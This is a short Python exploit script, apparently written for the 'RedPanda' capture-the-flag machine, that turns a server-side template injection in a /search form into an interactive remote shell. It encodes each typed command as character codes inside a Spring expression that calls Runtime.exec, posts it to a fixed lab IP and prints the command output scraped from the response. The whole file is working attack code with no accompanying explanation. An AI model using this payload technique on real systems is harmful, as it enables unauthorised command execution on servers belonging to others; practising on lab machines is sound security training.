import requests, signal
from cmd import Cmd
from bs4 import BeautifulSoup

print("\n[\033[1;32m+\033[1;37m] WebShell RedPanda ~ GatoGamer1155\n")
def kill(sig, frame):
    print("\n\n[\033[1;31m-\033[1;37m] Saliendo\n")
    exit(1)

signal.signal(signal.SIGINT, kill)

class RCE(Cmd):
    prompt = "\033[1;31m$\033[1;37m "
    def decimal(self, args):
        comando = args
        decimales = []

        for i in comando:
            decimales.append(str(ord(i)))
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % decimales[0]

        for i in decimales[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"
        data = { "name": payload }
        requer = requests.post("http://10.10.11.170:8080/search", data=data)
        parser = BeautifulSoup(requer.content, 'html.parser')
        grepcm = parser.find_all("h2")[0].get_text()
        result = grepcm.replace('You searched for:','').strip()
        print(result)

    def default(self, args):
        try:
            self.decimal(args)
        except:
            print("%s: command not found" % (args))

RCE().cmdloop()
